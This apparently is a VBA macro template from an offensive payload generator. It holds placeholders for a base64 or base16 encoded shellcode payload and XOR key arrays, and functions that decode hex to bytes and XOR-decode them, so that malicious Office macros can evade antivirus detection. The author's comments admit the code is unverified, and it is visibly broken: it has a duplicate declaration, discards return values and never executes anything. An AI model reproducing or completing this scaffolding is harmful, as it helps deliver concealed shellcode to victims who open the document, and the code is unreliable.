' README
' I've had a lot of issues getting this to work and i can't be bothered debugging VBA as it's disgusting
' but i've checked the XOR function and i'm fairly sure it's working correctly

Dim xorString as Variant
xorString = "{{ xorStringValue }}"

Dim xorKeyInt() as Variant
xorKeyInt() = Array({{ xorIntArray }})

Dim xorKeyHex() as Variant
xorKeyHex() = Array({{ xorHexArray }})

Dim intArray() As Variant
intArray() = Array({{ intArray }})

Dim hexArray() As Variant
hexArray() = Array({{ hexArray }})

' ENCODED BASE64 PAYLOAD
Dim encodedShellcode As String 
encodedShellcode = {{ base64EncodedPayload }}

' ENCODED BASE16 PAYLOAD
Dim encodedShellcode As String 
encodedShellcode = {{ base16EncodedPayload }}
base16ToByteArray(encodedShellcode)

Function base16ToByteArray(base16String As String) As Variant
    Dim sbyte
    Dim barray({{ byteCount+1 }}) As Variant
    For counter = 1 To {{ byteCount+1 }}
        sbyte = Mid(base16String, (counter * 2) - 1, 2)
        barray(counter - 1) = Val("&H" & sbyte)
    Next
    base16ToByteArray = barray()
End Function

' harcoding some values here because vba is disgusting
Function xorf(bytes() As Variant, xorbytes() As Variant) As Variant
    
    Dim keyItr As Integer
    
    For counter = 0 To {{ byteCount }}
        keyItr = counter Mod {{ xorByteCount }}
        bytes(counter) = bytes(counter) Xor xorbytes(keyItr)
    Next
    
    xorf = bytes()
End Function

' i hate VBA
xorf(intArray(), xorKeyInt())
